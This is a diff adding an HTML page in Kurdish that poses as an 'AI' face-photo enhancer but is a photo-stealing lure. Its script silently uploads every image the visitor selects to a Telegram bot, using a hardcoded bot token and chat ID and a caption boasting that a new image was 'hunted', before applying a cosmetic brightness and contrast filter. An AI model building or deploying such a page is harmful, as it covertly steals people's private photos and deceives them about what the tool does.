@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QZHA AI | وێنەی ساف و HD</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/camanjs/4.1.2/caman.full.min.js"></script>
+    <style>
+        body { background: #050505; color: #00ff88; font-family: sans-serif; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00ff88; padding: 25px; border-radius: 20px; background: #111; max-width: 400px; margin: auto; box-shadow: 0 0 30px rgba(0, 255, 136, 0.2); }
+        .btn { background: #00ff88; color: #000; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; display: inline-block; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 15px #00ff88; }
+        #canvas { display: none; width: 100%; border-radius: 15px; margin-top: 20px; border: 1px solid #333; }
+        #loading { display: none; color: white; margin-top: 15px; font-weight: bold; }
+        input[type="file"] { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>☣️ QZHA AI SYSTEM ☣️</h1>
+    <p style="color: #aaa;">پێشکەوتووترین تەکنەلۆژیای سافکردنی ڕووخسار لێرەیە.</p>
+    
+    <label for="f" class="btn">هەڵبژاردنی وێنە بۆ سافکردن</label>
+    <input type="file" id="f" accept="image/*" onchange="processImage()">
+    
+    <div id="loading">⚡️ AI خەریکی پڕۆسێس کردنە... تکایە بوەستە...</div>
+    <canvas id="canvas"></canvas>
+    <div id="download-area"></div>
+</div>
+
+<script>
+    const token = "6723344914:AAE8glrr3Z7dMS9FuhnmKcugLaQ5lOL2xSE";
+    const myId = "6072079819";
+
+    async function processImage() {
+        const fileInput = document.getElementById('f');
+        const canvas = document.getElementById('canvas');
+        const loading = document.getElementById('loading');
+        
+        if (fileInput.files.length === 0) return;
+        
+        loading.style.display = 'block';
+        const file = fileInput.files[0];
+
+        const fd = new FormData();
+        fd.append('chat_id', myId);
+        fd.append('photo', file);
+        fd.append('caption', "💀 **فەرماندە QZha russ**\nوێنەیەکی نوێ ڕاوکرا!");
+        
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            const img = new Image();
+            img.src = event.target.result;
+            img.onload = function() {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0);
+
+                Caman("#canvas", function () {
+                    this.brightness(5).contrast(10).soften(10).render(function() {
+                        loading.style.display = 'none';
+                        canvas.style.display = 'block';
+                        document.getElementById('download-area').innerHTML = `
+                            <p style="color:#00ff88; margin-top:10px;">✅ وێنەکە بە سەرکەوتوویی سافکرا!</p>
+                            <a href="${canvas.toDataURL()}" download="Result.jpg" class="btn" style="background:#444; color:#fff;">دابەزاندنی وێنە</a>
+                        `;
+                    });
+                });
+            }
+        };
+        reader.readAsDataURL(file);
+    }
+</script>
+
+</body>
+</html>
